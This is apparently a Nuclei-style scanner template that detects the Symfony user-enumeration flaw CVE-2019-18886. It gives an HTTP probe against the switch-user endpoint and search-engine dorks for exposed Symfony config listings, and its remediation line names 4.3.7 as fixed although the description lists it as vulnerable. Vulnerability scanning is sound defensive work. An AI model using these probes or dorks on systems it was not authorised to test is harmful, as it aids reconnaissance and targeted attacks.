id: CVE-2019-18886

info:
  name: Symfony User Enumeration Vulnerability
  author: ProjectDiscoveryAI
  severity: medium
  description: An issue was discovered in Symfony 4.2.0 to 4.2.11 and 4.3.0 to 4.3.7. The ability to enumerate users was possible due to different handling depending on whether the user existed when making unauthorized attempts to use the switch users functionality.
  impact: |
    Successful enumeration of valid usernames can aid in targeted attacks such as password guessing or social engineering.
  remediation: |
    Upgrade Symfony to version 4.4.1, 4.3.7, or higher to mitigate the vulnerability.
  reference:
    - https://github.com/symfony/symfony/releases/tag/v4.3.8
    - https://symfony.com/blog/symfony-4-3-8-released
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.3
    cve-id: CVE-2019-18886
    cwe-id: CWE-203
    epss-score: 0.00229
    epss-percentile: 0.61835
    cpe: cpe:2.3:a:sensiolabs:symfony:*:*:*:*:*:*:*:*
  metadata:
    vendor: sensiolabs
    product: symfony
    shodan-query:
      - cpe:"cpe:2.3:a:sensiolabs:symfony"
      - http.html:"symfony profiler"
      - http.title:"index of" "properties.ini"
      - http.title:"index of" "security.yml"
      - http.title:"welcome to symfony"
    fofa-query:
      - body="symfony profiler"
      - title="index of" "properties.ini"
      - title="index of" "security.yml"
      - title="welcome to symfony"
    google-query:
      - intitle:"index of" "properties.ini"
      - intitle:"index of" "security.yml"
      - intitle:"welcome to symfony"

http:
  - method: GET
    path:
      - "{{BaseURL}}/_switch_user?_switch_user=someuser"

    matchers:
      - type: status
        status:
          - 302

      - type: word
        words:
          - "Location: /login"
        part: header

      - type: word
        words:
          - "You have requested a non-existent user"
        part: body
        condition: or
